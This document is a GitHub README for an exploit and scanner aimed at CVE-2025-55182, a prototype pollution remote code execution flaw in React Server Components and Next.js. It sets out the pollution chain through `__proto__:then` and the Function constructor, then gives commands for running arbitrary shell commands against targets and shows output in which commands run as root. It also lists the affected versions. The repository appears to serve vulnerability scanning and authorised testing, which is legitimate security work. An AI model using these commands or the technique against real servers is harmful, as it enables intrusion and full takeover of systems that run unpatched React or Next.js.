# CVE-2025-55182 - React & Next.js Server Actions RCE Exploit

Full-featured Remote Code Execution exploit and scanner for CVE-2025-55182 in React/Next.js Server Actions.

**Original PoC:** [Spritualkb/CVE-2025-55182-exp](https://github.com/Spritualkb/CVE-2025-55182-exp)

## Overview

CVE-2025-55182 is a critical prototype pollution vulnerability in React Server Components that allows remote code execution. This repository provides both automated scanning (Nuclei template) and manual exploitation (Python script) tools.

**Vulnerability Mechanism:**

The exploit leverages prototype pollution in React Flight Protocol deserialization. It pollutes `Object.prototype.then` via `"$1:__proto__:then"` and gains Function constructor access through `_formData.get` set to `"$1:constructor:constructor"`, then injects malicious code via `_prefix` that gets executed by `Function()`.

## Tools

### 1. Nuclei Template (`cve-2025-55182.yaml`)

Automated vulnerability scanner that executes the `id` command and retrieves output via `X-Action-Redirect` header.

**Usage:**
```bash
nuclei -u http://target.com:3000 -t cve-2025-55182.yaml
```

**Features:**
- Executes test command (`id`) to verify RCE
- Extracts command output from response headers
- Multiple detection indicators (status 303, redirect headers, error patterns)

### 2. Python RCE Exploit (`CVE-2025-55182.py`)

Full-featured RCE exploit script that executes arbitrary commands and retrieves output.

**Usage:**
```bash
python3 CVE-2025-55182.py http://target.com:3000 -c "id"
python3 CVE-2025-55182.py https://target.com -c "whoami" --no-check-ssl
python3 CVE-2025-55182.py 192.168.1.100:3000 -c "uname -a"
```

**Features:**
- Execute arbitrary commands
- Automatic output extraction from `X-Action-Redirect` header
- Support for HTTP/HTTPS and IP:PORT formats
- SSL certificate verification bypass option
- Clean, formatted output

## Test Results

### Nuclei Template

```
$ nuclei -u http://localhost:3001 -t cve-2025-55182.yaml

[cve-2025-55182:command_output] [http] [critical] http://localhost:3001 ["uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)"]
[INF] Scan completed in 28.35483ms. 1 matches found.
```

### Python Exploit

```
$ python3 CVE-2025-55182.py http://localhost:3001 -c "id"

============================================================
CVE-2025-55182 RCE Exploit
React Server Components Remote Code Execution
============================================================

[*] Target: http://localhost:3001
[*] Command: id
[*] Building payload...
[*] Sending exploit payload...

============================================================
[+] Command executed successfully!
============================================================
[+] Command Output:
------------------------------------------------------------
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
------------------------------------------------------------

============================================================
[*] Exploitation attempt completed
============================================================
```


## Affected Versions

- **react-server-dom-webpack**: 19.0.0, 19.1.0, 19.1.1, 19.2.0
- **react-server-dom-parcel**: 19.0.0, 19.1.0, 19.1.1, 19.2.0
- **react-server-dom-turbopack**: 19.0.0, 19.1.0, 19.1.1, 19.2.0
- **Next.js**: 15.x, 16.x (App Router with Server Actions)


## Credits

- **Original PoC**: [Spritualkb](https://github.com/Spritualkb) - [CVE-2025-55182-exp](https://github.com/Spritualkb/CVE-2025-55182-exp)

## References

- [React Security Advisory](https://react.dev/blog/2025/12/03/critical-security-vulnerability-in-react-server-components)
- [Next.js GitHub](https://github.com/vercel/next.js)

## Disclaimer

**FOR EDUCATIONAL AND AUTHORIZED TESTING PURPOSES ONLY**
